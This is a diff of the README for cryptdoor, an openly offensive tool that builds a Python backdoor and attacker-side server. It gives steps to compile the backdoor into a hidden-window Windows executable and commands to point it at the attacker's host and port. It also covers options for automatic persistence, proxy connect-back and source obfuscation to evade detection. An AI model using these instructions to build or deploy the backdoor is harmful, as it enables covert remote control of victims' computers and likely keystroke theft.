@@ -19,15 +19,15 @@ The backdoor script can be compiled to a standalone PE executable using pyinstal
 3. Press Windows Key+Pause, then "Advanced system settings" then "Environment Variables"
 4. You might or not have a "PATH" variable listed there if not add one and write
 
-	"C:\Python27;C:\Python27\Scripts"
+        "C:\Python27;C:\Python27\Scripts"
 
 If you do already have one just add a colon before adding this to the variable like:
 
-	"C:\oldpath;C:\Python27;C\Python27\Scripts"
+        "C:\oldpath;C:\Python27;C\Python27\Scripts"
 
 5. Open a new cmd terminal and you should be able to:
 
-	pip install pyinstaller pycrypto
+        pip install pyinstaller pycrypto
 
 6. Add ';C:\Python27\Lib\site-packages\PyInstaller' to the end of your PATH variable
 7. Install pyHook: http://sourceforge.net/projects/pyhook/files/latest/download
@@ -35,7 +35,7 @@ If you do already have one just add a colon before adding this to the variable l
 9. Place the socks.py file in the same directory as backdoor.py if you want to use a proxy.
 10. Open a new cmd promt and cd to wherever backdoor.py is.
 
-	pyinstaller -F -w backdoor.py
+        pyinstaller -F -w backdoor.py
 
 11. That's it, enjoy your exe in dist.
 
@@ -61,11 +61,11 @@ Usage
 cryptdoor.py will make the backdoor and server.
 The syntax is:
 
-	./cryptdoor.py -i host -p port
+        ./cryptdoor.py -i host -p port
 
-You can add a -a to attempt automatic persistence like:
+You can add a -a to attempt automatic persistence and obfuscation with:
 
-	./cryptdoor.py -i host -p port -a
+        ./cryptdoor.py -i host -p port -a -o
 
 host and port refer to the host and port of the listening server (attacker).
 These are the options you have from within the shell:
@@ -102,4 +102,9 @@ If you wish to have your backdoor connect back to you through a HTTP/s proxy, th
 	./cryptdoor.py -i DDNS -p port -x
 
 
+Obfuscation
+=========
 
+Obfuscation of the backdoor source code is acheived using:
+
+https://github.com/astrand/pyobfuscate
